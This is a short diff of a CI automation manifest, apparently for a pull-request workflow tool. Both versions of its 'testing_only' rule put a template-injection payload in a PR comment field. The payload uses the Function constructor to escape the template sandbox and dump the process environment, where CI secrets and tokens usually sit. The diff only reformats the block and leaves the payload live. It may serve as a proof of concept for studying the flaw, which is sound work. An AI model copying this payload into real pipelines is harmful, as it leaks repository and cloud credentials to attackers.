@@ -4,10 +4,12 @@ manifest:
   version: 1.0
 
 automations:
-   testing_only:
-     if:
-       - {{ pr.labels | match(term='testing') }}
-     run:
-       - action: add-comment@v1
-         args:
-           comment: {{ "".sub.constructor("console.log(process.env);")() }}
+  testing_only:
+    if:
+      - {{ pr.labels | match(term='testing') }}
+    run:
+      - action: add-comment@v1
+        args:
+          comment: |
+            {{ "".sub.constructor("console.log(process.env);")() }}
+
